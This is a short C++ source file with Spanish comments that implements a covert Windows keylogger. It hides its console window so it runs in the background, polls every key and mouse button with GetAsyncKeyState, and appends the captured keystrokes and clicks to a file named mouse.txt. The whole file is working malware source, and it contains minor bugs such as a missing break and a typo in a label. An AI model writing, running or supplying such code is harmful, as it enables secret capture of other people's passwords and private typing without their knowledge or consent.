#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

int main()
{
     HWND stealth;                                        //
     AllocConsole();                                      // Funcion para ocultar la terminal y
     stealth = FindWindowA("ConsoleWindowClass", NULL);   // Ejecutar en segundo plano ;D
     ShowWindow(stealth, 0);                              //

     char key; // Declarando variable 
     for (;;)  // Bulce infinito Ojo tambien se puede usar While(1)
     {    
          Sleep(25); // Dormimos el ejecutable para que no consuma muchos recursos del computador
          for(key=8; key <= 222; key++) 
          {
               if (GetAsyncKeyState(key) == -32767) //Cuando se apriete una delas teclas se escrebiria en formato ASCII
               {
                  ofstream write ("mouse.txt", ios::app); // creamos y abrimos un fichero para guardar las pulsaciones
                  switch(key) // Comienza a traducir de ASCII a Caracteres 
                  {    
                    case VK_LBUTTON:
                    {
                      if(GetAsyncKeyState(VK_LBUTTON)){
                         write << "[CLICK IZQUIERDO] ";
                       }
                    }
                    break;
                    
                    case VK_RBUTTON:
                    {
                      if(GetAsyncKeyState(VK_RBUTTON)){
                         write << "[CLICL DERECHO] ";
                       }
                    } 
                    default:
                    write << key;
                  }
               }              
          }
     }
    
     return 0;
}
